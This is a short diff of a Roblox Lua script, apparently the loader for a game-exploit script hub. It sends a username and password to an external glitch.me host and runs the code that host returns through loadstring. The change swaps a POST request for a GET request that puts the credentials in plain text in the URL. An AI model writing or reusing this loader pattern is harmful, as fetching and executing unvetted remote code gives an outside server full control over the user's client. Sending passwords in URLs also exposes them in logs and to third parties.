@@ -5,4 +5,5 @@ local loginDetails = {
     password = "password"
 }
 
-loadstring(game:HttpPostAsync('https://mobyhub-pipeline.glitch.me/script', HttpService:JSONEncode(loginDetails), "application/json"))()
+--loadstring(game:HttpPostAsync('https://mobyhub-pipeline.glitch.me/script', HttpService:JSONEncode(loginDetails), "application/json"))()
+loadstring(game:GetAsync('https://mobyhub-pipeline.glitch.me/script/' .. loginDetails.username .. "/" .. loginDetails.password, true))() 
